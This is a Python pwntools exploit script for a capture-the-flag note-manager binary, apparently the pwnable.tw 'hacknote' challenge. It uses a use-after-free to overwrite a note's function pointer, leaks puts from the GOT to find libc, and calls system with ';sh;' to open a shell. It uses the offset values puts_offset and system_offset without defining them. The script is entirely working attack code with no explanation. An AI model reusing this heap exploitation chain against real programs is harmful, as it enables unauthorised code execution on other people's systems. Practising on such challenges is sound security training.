#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.update(binary=elf, log_level = 'debug')
p = elf.process()
gdb.attach(p, '''
 	b *0x80487d4	
 	b *0x80488a5	
 	b *0x8048646	
''')
'''
	b *0x80487d4	# deleteNote
	b *0x80488a5	# printNote
	b *0x8048646	# addNote
'''
# p = remote('chall.pwnable.tw', '10102')

def addNote(size, content):
	p.sendlineafter(b'Your choice :', b"1")
	p.sendlineafter(b'Note size :', str(size).encode())
	p.sendafter(b'Content :', content)
	p.recvuntil(b'Success !')

def deleteNote(index):
	p.sendlineafter(b'Your choice :', b"2")
	p.sendlineafter(b'Index :', str(index).encode())
	p.recvuntil(b'Success')

def printNote(index):
	p.sendlineafter(b'Your choice :', b"3")
	p.sendlineafter(b'Index :', str(index).encode())

addr_print_note = 0x0804862b
# return puts(note->content); # variable 1 of struct NOTE is pointer => 
putsGot = 0x804a024

# leak libc 
addNote(16, b'A' * 4)	# idx = 0
addNote(16, b'B' * 4)	# idx = 1

deleteNote(0)
deleteNote(1)

addNote(8, p32(addr_print_note) + p32(putsGot))

printNote(0)	# freed and now located idx = 2 but can print content of idx 0

puts_libc = u32(p.recv(4))
libc_base = puts_libc - puts_offset
system_libc = libc_base + system_offset

log.success('Addr puts libc: ' + hex(puts_libc))
log.success('Addr libc base: ' + hex(libc_base))
log.success('Addr system libc: ' + hex(system_libc))

# get shell
deleteNote(2)	# delete to reallocated idx 2
addNote(8, p32(system_libc) + b';sh;')
printNote(0)

p.interactive()